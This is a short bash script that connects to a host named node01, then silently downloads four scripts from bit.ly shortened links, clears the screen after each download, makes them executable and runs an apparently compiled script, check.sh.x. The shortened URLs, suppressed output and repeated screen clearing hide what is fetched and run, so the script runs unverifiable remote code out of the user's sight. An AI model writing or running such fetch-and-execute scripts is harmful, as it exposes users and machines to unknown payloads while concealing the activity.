#!/bin/bash
ssh node01
wget -O exit.sh https://bit.ly/3BBLPbC > /dev/null 2>&1
clear
wget -O sleep.sh https://bit.ly/3zzuJJh > /dev/null 2>&1
clear
wget -O main.sh https://bit.ly/3ygtUVF > /dev/null 2>&1
clear
wget -O check.sh.x https://bit.ly/3kTpvUD > /dev/null 2>&1
clear
chmod +x main.sh
chmod +x exit.sh
chmod +x sleep.sh
./check.sh.x
